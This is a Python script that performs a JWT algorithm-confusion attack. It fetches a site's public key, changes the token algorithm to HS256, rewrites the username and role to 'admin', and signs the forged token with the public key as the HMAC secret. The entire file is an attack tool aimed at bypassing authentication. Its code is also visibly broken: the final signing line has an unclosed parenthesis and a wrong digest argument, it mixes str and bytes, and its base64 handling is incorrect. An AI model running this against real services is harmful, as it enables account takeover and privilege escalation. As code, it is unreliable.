import base64
import re
import requests
from OpenSSL import SSL
import hmac 
import hashlib 
print("#####                 #            #####         ") 
print("#     # ##### #####   ##   #    # #     # #####  ")
print("#         #   #    # # #   #   #        # #    # ")
print("#####     #   #    #   #   ####    #####  #    # ") 
print("      #   #   #####    #   #  #         # #####  ")
print("#     #   #   #   #    #   #   #  #     # #   #  ")
print("#####     #   #    # ##### #    #  #####  #    # ") 
print(" creator : heidi +--- Thanks to: Kawkab" +"\n")


url= input("please enter the url to get the public key from : \n") #url to get the public key from
JWT = input("please enter you JWT :\n")
def validate_JWT(JWT):
    try:
        x = re.search("[A-Za-z0-9+/]+\.[A-Za-z0-9+/]+\.[A-Za-z0-9+/]+", JWT)
        if x ==  None:
            raise NameError('wrong JWT format .... please try again')
    except NameError:
     print('wrong JWT format .... please visit https://jwt.io/ for more info about JWT') 
     quit()# terminate the program
validate_JWT(JWT)
Alg = input("please enter the algorithm you want to replace : \n")
Username = input("please enter the username you want to replace : \n")
Role = input("please enter the role you want to replace : \n")
publickey_path="/public.pem"
Full_url=url+publickey_path #concatenate the full path as url + path
r = requests.get(Full_url) #send a get req to the url
f=open('public.pem','a') #open a new file called public.pem and append to it the content 
key=''.join(r.text) #concatenate the response into a variable (get the public key)
f.write(key) #write the response into a file 
f.close() #close the file
print("\n")
new_splited_jwt = JWT.split(".") #cut the token into header , payload and signature 
padding = "==" #add the padding ==  into the end of base64 for each of header , payload and signature parts to decode them later
print("The new splitted JWT :   ",new_splited_jwt)
print("\n")
Header = new_splited_jwt[0]+padding #put the splitted header into the variable and add the padding to it
Payload = new_splited_jwt[1]+padding #put the splitted payload into the variable and add the padding to it
Verified_Signature = new_splited_jwt[2]+padding #put the splitted signature into the variable and add the padding to it
print("The splitted Header is :   ",Header + "\n")
print("The splitted Payload is :   ",Payload + "\n")
print("The splitted signature is :   ",Verified_Signature + "\n")
Header_decoded = base64.b64decode(Header) #decode header 
Payload_decoded = base64.b64decode(Payload) #decode payload 
#Verified_Signature_decoded = base64.b64decode(Verified_Signature) #decode signature from base 64 and hex
print("The decoded Header is :   " ,Header_decoded.decode("UTF-8") +"\n") #decode signature from base 64 and hex
print("The decoded Payload is :   " ,Payload_decoded.decode("UTF-8") +"\n") #decode signature from base 64 and hex
#print("The decoded Signature is :   " ,Verified_Signature_decoded.decode("UTF-8") +"\n") #decode signature from base 64 and hex

str_header = str(Header_decoded,'utf-8') #convert the bytes objects to string , to apply the string operations on it
alg_substitute = str_header.replace(Alg,'HS256')  #to replace the alg with HS256 and sign the token as the RSA alg uses the public key to verify the token so same for HMAC alg
print("The Header with the substituted Alg is :   " ,alg_substitute ,"\n")

str_payload = str(Payload_decoded,'utf-8')
username_substitute = str_payload.replace(Username,'admin') #convert the bytes objects to string , to apply the string operations on it to replace username with admin
print("The Payload with the substituted username is :   " ,username_substitute ,"\n")

role_substitute = username_substitute.replace(Role,'admin') #change the role to admin
print("The Payload with the substituted Role is :   " ,role_substitute ,"\n")

#Verified_Signature_decoded = ""
def encode_JWT(alg_substitute,role_substitute):
    Header_bytes = alg_substitute.encode('UTF-8')  #convert to bytes to be encoded 
    Payload_bytes = role_substitute.encode('UTF-8') #convert to bytes to be encoded 
    Header_enc = base64.b64encode(Header_bytes) # base64 encode
    Payload_enc = base64.b64encode(Payload_bytes) # base64 encode
    Header_removed_bytes = Header_enc.decode('UTF-8')
    Payload_removed_bytes = Payload_enc.decode('UTF-8')
    Header_enc = Header_removed_bytes[:] #convert the separated char to string
    Payload_enc = Payload_removed_bytes[:]#convert the separated char to string
    new_JWT = Header_enc+"."+Payload_enc #concat the new JWT as <Header.Payload>
    return new_JWT

Maliformed_JWT = encode_JWT(alg_substitute,role_substitute)
print("The New Generated JWT is     :",Maliformed_JWT)
print("\n")
signature_signed=base64.b64encode(hmac.digest(key, Maliformed_JWT, hashlib.sha256().digest())
Final_JWT=Maliformed_JWT+"."+signature_signed
print(Final_JWT)
